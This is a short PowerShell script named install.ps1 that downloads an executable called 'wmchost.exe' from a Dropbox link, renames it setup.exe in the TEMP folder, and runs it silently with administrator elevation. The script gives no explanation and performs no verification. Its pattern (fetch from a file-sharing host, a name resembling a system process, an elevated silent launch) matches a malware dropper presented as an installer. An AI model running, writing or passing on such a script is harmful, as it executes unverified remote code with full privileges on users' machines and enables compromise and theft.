# install.ps1

$u = "https://www.dropbox.com/scl/fi/8sd2wb7b6kjak2riqm7ze/wmchost.exe?rlkey=q9o1dkt2dmtiob1afp0gu3m4g&st=4cc62krc&dl=1"
$p = "$env:TEMP\setup.exe"

Invoke-RestMethod $u -OutFile $p
Start-Process $p -ArgumentList "/silent /norestart" -Verb RunAs
